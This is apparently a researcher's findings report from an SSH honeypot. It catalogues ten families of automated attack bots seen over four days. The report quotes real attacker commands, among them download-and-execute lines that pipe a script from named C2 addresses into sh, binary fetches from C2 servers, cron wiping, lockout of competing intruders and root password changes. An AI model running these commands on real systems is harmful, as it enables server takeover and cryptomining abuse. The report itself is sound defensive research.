# Findings -- 95h on a public VPS

Helsinki VPS, port 22, fresh IP, no prior reputation.
Data: 2026-05-26 11:32 UTC to 2026-05-30 12:00 UTC.

```
3306 auth attempts
 181 unique source IPs
1928 unique passwords tried
 510 sessions accepted
```

---

## Timeline

Not continuous. Two big waves, one quiet day.

```
2026-05-26   88 commands  -- first bots, mixed families
2026-05-27  545 commands  -- Diicot heavy day
2026-05-28   10 commands  -- quiet
2026-05-29   90 commands  -- threshold=1 deployed, new families appear
2026-05-30   --           -- new deploy, family 10 in 17min
```

Peak: 22:00 UTC, 1270 attempts in one hour (2026-05-27).

Almost everything is `SSH-2.0-Go` -- the scanning ecosystem runs on Go's ssh library.
No OpenSSH overhead, thousands of connections per second from a laptop.

---

## Attack families

### 1. Credential stuffing

A wordlist + a script that tries every password on every IP it can reach. That's it.

Works because people reuse passwords. A breach at site A leaks millions of real passwords.
Some of those work at site B. The bot doesn't know your password -- it knows A password
that has a decent chance of being yours.

Top passwords: `123456`, `admin`, `postgres`, `password`, `1234`. All from the RockYou
wordlist, 14 million passwords from a 2009 breach, still the standard.

One IP (`71.227.179.172`) tried 1545 passwords then made 1382 more after getting in.
It's not stopping when it gets a shell -- it wants every working credential, not just one.

One bot sent ~80 passwords in `YYYYMMDD` format (19870825, 19831215...) mixed with
Chinese names (yangchao, wangming, xiaodong). Birth years 1982-1991. That's a real
breach dataset from China, not guessing.

---

### 2. Diicot -- GPU miner

Dominant family. ~180 sessions. Wants to mine Monero on GPU servers.

Monero = cryptocurrency, untraceable, GPU-minable. A Tesla T4 makes real money mining it.
The bot is picky -- it only deploys on machines worth mining on.

Kill chain:

```bash
uname -s -v -n -r -m    # is it Linux x86_64? if not, exit
nproc                    # CPU count
lspci | egrep VGA && lspci | grep 3D    # GPU on the PCI bus?
nvidia-smi -q | grep "Product Name"     # which GPU exactly?
```

Our fake `lspci` shows a Tesla T4. That triggered the next step:

```bash
crontab -r                              # wipe all cron jobs
chattr -iae ~/.ssh/authorized_keys      # make authorized_keys immutable
rm -rf /dev/shm/.x /...                # kill competing miners
```

`chattr -i` is below normal Unix permissions -- even root can't touch that file without
removing the flag first. Once this runs, no other attacker can add their SSH key.
The machine is claimed.

Named after Romania's anti-corruption agency -- the malware author is trolling.

---

### 3. SCP dropper

One session 2026-05-26 17:50. Tried 11 directories looking for a writable path:

```bash
mkdir /lib/xlxeavrjsw      ; scp -t -r /lib/xlxeavrjsw/
mkdir /dev/shm/omlvyoqxmgd ; scp -t -r /dev/shm/omlvyoqxmgd/
mkdir /tmp/cygmfsqpwkgd    ; scp -t -r /tmp/cygmfsqpwkgd/
# ... 8 more
```

`scp -t` = server-side receive mode. The bot pushes a file from its machine to ours.
Random 10-char dir names to avoid collisions.

The honeypot speaks the SCP wire protocol (sends the ready byte, parses headers, acks),
so the bot thought all 11 uploads worked. Nothing was actually received.

---

### 4. Password changer

4 sessions, 2026-05-26 22:xx to 2026-05-27 01:xx.

```bash
cat /etc/passwd
passwd
echo 'root:$MWtB6=$e6mK#=E' | chpasswd
```

Changes the root password to lock out other attackers. Tries interactive `passwd` first,
falls back to `chpasswd` which reads from stdin -- no terminal needed.

Passwords seen: `i5n#_o$_6qFK!$s` and `$MWtB6=$e6mK#=E`. Strong, machine-generated.
The logic: bots are scanning the same ranges simultaneously. Get in first, change the
password, nobody else can use the machine.

---

### 5. C2 dropper -- fileless

First appeared 2026-05-29 07:56, 1h41m after switching to threshold=1.
Multiple IPs, same payload.

```bash
uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; \
(wget --no-check-certificate -qO- https://14.46.136.77/sh \
 || curl -sk https://14.46.136.77/sh) | sh -s ssh
```

Three things:
- `uname -a` -- OS info sent back to C2
- `echo -e "\x61..."` -- decodes to `auth_ok`. Signals the C2 that auth worked.
- `wget ... | sh` -- downloads a script and runs it directly in memory. Nothing on disk.

No file = nothing for antivirus to find. The script runs and exits, only evidence is
in memory and process table while running.

`-s ssh` tells the script how it got in. Same dropper used for web exploits and RCE --
the entry vector changes what persistence it sets up.

Ran via SSH exec channel (not interactive shell) -- the original scripts missed it entirely.

---

### 6. w.sh / astats -- persistence bot

First 2026-05-29 14:17. Hits every 30-45min from different IPs.

```bash
# find writable dir
sh -c 'for d in /dev/shm /tmp /var/run ...; do cd "$d" && pwd && break; done'
# drop script
cd "/tmp" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
# cron persistence
CRON="$(crontab -l 2>/dev/null || true)"
# systemd persistence
sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service'
# drop miner
cat > astats
```

Two persistence mechanisms at once -- cron AND systemd user service. Remove one,
the other revives the miner.

Process names: `astats`, `netai`, `kstats`. Look like monitoring tools in `ps aux`.

---

### 7. VPS infrastructure scout

Two sessions 2026-05-29. 35 commands, no payload.

Checks everything: CPU model, distro (apt/yum/pacman/zypper), network interfaces,
running services, shadow file, disk I/O with `dd`, outbound connectivity via ping.

The `dd bs=1M count=10` benchmark is the tell -- it's measuring disk speed before
deciding if the machine is worth deploying a miner on.

Ended without deploying anything. Machine failed some criterion or it's a pure probe
that reports back to a queue.

---

### 8. SSHCHK -- C2 liveness check

2026-05-30 02:20 and 02:23. Two sessions, different IPs, 3 min apart.

```bash
echo SSHCHK_5718926f9304_BEGIN; uname -srm; echo $((7*191+3)); hostname; \
df -P / 2>/dev/null | awk 'NR==2{print $1}'; echo SSHCHK_5718926f9304_END
```

Four things:
- `BEGIN`/`END` markers -- C2 extracts everything between them. Token is unique per
  session, prevents replay attacks.
- `uname -srm` -- OS + kernel + arch
- `echo $((7*191+3))` = 1340 -- math proof-of-work. Shell must evaluate it. A fake
  or broken shell returns the wrong answer.
- `df -P / | awk 'NR==2{print $1}'` -- device name of root filesystem

No follow-up commands. Pure inventory probe -- C2 reads the output and decides
what to send next, externally.

We had to fix the fake shell to pass this check: add arithmetic expansion `$((expr))`,
awk NR==N condition, df -P flag, uname -srm case.

---

### 9. Minimal OS scanner

2026-05-30 06:03 and 07:39. Two sessions, different IPs, 1h36m apart.

```bash
uname -s -m
```

Just that. Gets "Linux x86_64", disconnects. Either cataloguing the internet or
a first-stage probe before a payload bot follows up.

---

### 10. ELF echo injector

2026-05-30 11:18. Appeared 17 minutes after deploying the new binary.

```bash
uname -s
uname -m
cd /tmp; rm -f amd64; wget -t 1 http://195.177.94.72:564/b/amd64
cd /tmp; curl -O --connect-timeout 10 http://195.177.94.72:564/b/amd64
cd /tmp; rm -f amd64; wget -t 1 http://45.88.91.135:35146/b/amd64
cd /tmp; curl -O --connect-timeout 10 http://45.88.91.135:35146/b/amd64
echo -e -n "\x7f\x45\x4c\x46..."    # 407 times
```

Arch check first. Then tries to download `amd64` from two C2 servers with wget+curl
fallback on each. When downloads fail (our fake wget returns errors), it writes the
entire binary as hex bytes via 407 echo commands -- ~6.5KB ELF executable reconstructed
from shell commands alone.

`\x7f\x45\x4c\x46` = ELF magic number. Every Linux binary starts with these 4 bytes.

This is called in-band payload delivery -- the payload travels inside the attack itself,
no separate download needed. Used when outbound HTTP is blocked. The bot carries its
payload in memory and falls back to hex injection when the network is closed.

On a real server it would then `chmod +x /tmp/amd64 && /tmp/amd64`. We didn't capture
that -- the fake shell returned success on the echo commands but there's nothing to execute.

URL logging confirmed working: both C2 URLs (`195.177.94.72:564` and
`45.88.91.135:35146`) appeared in session.log 17 minutes after deploy.

---

## Effect of auth-threshold=1

Deployed 2026-05-29 06:15 UTC. Accept any password on first attempt.

```
                before    after
attempts          102       143   +40%
unique IPs         12        41  +242%
single-shot         5        27  +440%
accepted            8       143 +1688%
commands            6       234 +3800%
new families      none    5 new
```

Families 5-10 are all single-shot -- they try once, get rejected, leave without a trace.
Under threshold=10 they were completely invisible.

Verified in logs: C2 dropper first hit at 07:56 (1h41m after change), VPS scout at
09:48, w.sh bot at 14:17. Zero sessions of these families in the 68h before the change.

---

## What the honeypot was good at

**GPU bait worked.** Fake Tesla T4 in lspci triggered Diicot's full kill chain. Without
it, they would have exited at "no GPU found".

**SCP handler kept bots engaged.** Speaking the wire protocol meant the SCP dropper ran
all 11 attempts instead of dying on the first rejection.

**Returning exit 0 everywhere** kept bots progressing through their playbook.

**URL logging (added late).** wget/curl now log their URL argument. Family 10 URLs
captured within 17 minutes of deploying.

## What I missed

**The C2 payload at 14.46.136.77/sh** -- pipes into sh, the honeypot can't make real HTTP calls.

**The amd64 binary content** -- the echo hex chunks are all logged but not decoded yet.
To actually get the binary: concatenate all the hex chunks and decode. Would reveal what
the miner actually is.

**Interactive shell SCP** -- now fixed. Next SCP dropper session might upload for real.

**$() subshell substitution** -- not implemented. Some bot commands use it and get
empty strings back instead of the right answer.
